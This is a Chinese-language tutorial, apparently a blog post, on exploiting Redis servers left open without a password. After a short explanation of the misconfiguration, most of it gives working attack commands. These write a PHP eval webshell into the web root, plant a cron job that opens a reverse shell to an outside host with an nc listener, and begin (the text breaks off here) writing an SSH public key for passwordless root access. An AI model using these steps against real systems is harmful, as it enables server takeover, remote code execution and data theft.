一.什么是redis

Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。是nosql（not only sql）数据库的一种。默认端口:6379

二.漏洞原理

众所周知redis安装成功后默认绑定在本机的6379端口，但是！再说详细点，他其实是默认绑定在0.0.0.0:6379，0.0.0.0表示网络中的所有主机，当然这里不是说随便输一个ip就能访问redis了哈，最起码给是安装了redis的服务器ip，如果你没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，那么你就可以访问：127.0.0.1:6379、内网ip:6379、公网ip:6379

重点来了！公网ip也能访问，就相当于将redis暴露在了公网当中，而且你说巧不巧，redis数据库默认访问不需要密码，谁都能访问，你说尴尬不尴尬。


漏洞产生的根本原因：

redis服务绑定在0.0.0.0:6379端口，而且信任了其他IP，导致了Redis服务暴露在公网上没有设置密码认证，可以免密登陆Redis服务

三.漏洞利用

1.漏洞危害

敏感信息泄露写入webshell如果redis以root权限运行，可以写入SSH公钥，直接通过SSH私钥连接登陆服务器在crontab里写定时任务，反弹shell

2.redis基础命令

远程连接redis:redis-cli -h 192.168.122.203
查看redis版本信息、一些具体信息、服务器版本信息等等：127.0.0.1:6379> info
获取全部键：127.0.0.1:6379> keys *
获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。127.0.0.1:6379> CONFIG GET dir127.0.0.1:6379> CONFIG GET dbfilename
将键x的值设为test、获取键x的值：127.0.0.1:6379> set x “test”127.0.0.1:6379> get x
批量设置键值对：127.0.0.1:6379> mset k1 v1 k2 v2 k3 v3OK
批量获取键值对：127.0.0.1:6379> mget k1 k2 k31) "v1"2) "v2"3) "v3"
删除一个数据库中的数据：127.0.0.1:6379> FLUSHALLOK127.0.0.1:6379> FLUSHDBOK

3.写入webshell

redis是有备份文件的，执行save命令后里面会记录着我们写入的键值对，备份文件的路径以及文件名我们可以修改：

127.0.0.1:6379> config set dir /var/www/html #把文件路径改成网站根目录这样才能访问OK127.0.0.1:6379> config set dbfilename 1.php #修改文件名为脚本语言的后缀OK127.0.0.1:6379> set x "\n\n\n<?php @eval($_REQUEST[8]); ?>\n\n\n" #写入木马，注意必须加\n，因为写出来的文件有一部分乱码不加\n会导致木马执行失败127.0.0.1:6379> saveOK

4.计划任务执行命令反弹shell

首先在我们自己的外网服务器监听一个端口

nc -lvvp 6666

在目标服务器的redis写入计划任务

127.0.0.1:6379> set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.1.101/6666 0>&1\n\n"127.0.0.1:6379> config set dir /var/spool/cron/127.0.0.1:6379> config set dbfilename root127.0.0.1:6379> save

计划任务执行后，我们自己的服务器收到shell

5.写入SSH公钥，免密登录对方服务器

首先在攻击机生成RSA公私钥对，密码设置为空

root@kali:~# ssh-keygen -t rsa

然后将生成的公钥写入到保存的新文件中，方便之后上传

(echo -e "\n\n\n"; cat /Users/shukasakai/.ssh/id_rsa.pub; echo -e "\n\n\n") > /test.txt
